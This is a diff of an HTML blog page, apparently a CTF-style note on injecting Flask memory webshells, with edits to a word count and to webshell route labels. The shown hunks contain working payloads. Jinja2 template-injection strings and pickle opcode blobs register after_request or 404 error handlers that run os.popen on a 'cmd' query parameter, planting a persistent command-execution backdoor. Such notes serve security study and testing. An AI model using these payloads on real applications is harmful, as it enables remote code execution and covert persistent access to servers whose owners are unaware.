@@ -207,7 +207,7 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">Word count in article: </span>
-      <span>927</span>
+      <span>929</span>
     </span>
     <span class="post-meta-item" title="Reading time">
       <span class="post-meta-item-icon">
@@ -266,7 +266,7 @@
 <h3 id="after-request-funcs-setdefault"><a href="#after-request-funcs-setdefault" class="headerlink" title="after_request_funcs.setdefault"></a>after_request_funcs.setdefault</h3><p>webshell	&#x2F;?cmd&#x3D;</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(&#x27;flask&#x27;).make_response(__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read())\&quot;)==None else resp)&quot;</span>,&#123;<span class="string">&#x27;request&#x27;</span>:url_for.__globals__[<span class="string">&#x27;request&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>
 
-<h3 id="error-handler-spec"><a href="#error-handler-spec" class="headerlink" title="error_handler_spec"></a>error_handler_spec</h3><p>webshell	&#x2F;?cmd&#x3D;</p>
+<h3 id="error-handler-spec"><a href="#error-handler-spec" class="headerlink" title="error_handler_spec"></a>error_handler_spec</h3><p>404webshell	&#x2F;404page?cmd&#x3D;</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;exec&#x27;</span>](<span class="string">&quot;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda e:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()&quot;</span>, &#123;<span class="string">&#x27;request&#x27;</span>:url_for.__globals__[<span class="string">&#x27;request&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <h2 id="Pickle反序列化"><a href="#Pickle反序列化" class="headerlink" title="Pickle反序列化"></a>Pickle反序列化</h2><h3 id="before-request-funcs-setdefault-1"><a href="#before-request-funcs-setdefault-1" class="headerlink" title="before_request_funcs.setdefault"></a>before_request_funcs.setdefault</h3><p>webshell	&#x2F;?cmd&#x3D;</p>
@@ -275,7 +275,7 @@
 <h3 id="after-request-funcs-setdefault-1"><a href="#after-request-funcs-setdefault-1" class="headerlink" title="after_request_funcs.setdefault"></a>after_request_funcs.setdefault</h3><p>webshell	&#x2F;?cmd&#x3D;</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;(c__builtin__</span></span><br><span class="line"><span class="string">eval</span></span><br><span class="line"><span class="string">V__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(&quot;global CmdResp;CmdResp=__import__(&#x27;flask&#x27;).make_response(__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read())&quot;)==None else resp)</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="error-handler-spec-1"><a href="#error-handler-spec-1" class="headerlink" title="error_handler_spec"></a>error_handler_spec</h3><p>404webshell	&#x2F;?cmd&#x3D;</p>
+<h3 id="error-handler-spec-1"><a href="#error-handler-spec-1" class="headerlink" title="error_handler_spec"></a>error_handler_spec</h3><p>404webshell	&#x2F;404page?cmd&#x3D;</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;(c__builtin__</span></span><br><span class="line"><span class="string">exec</span></span><br><span class="line"><span class="string">Vexc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda e:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
 
 
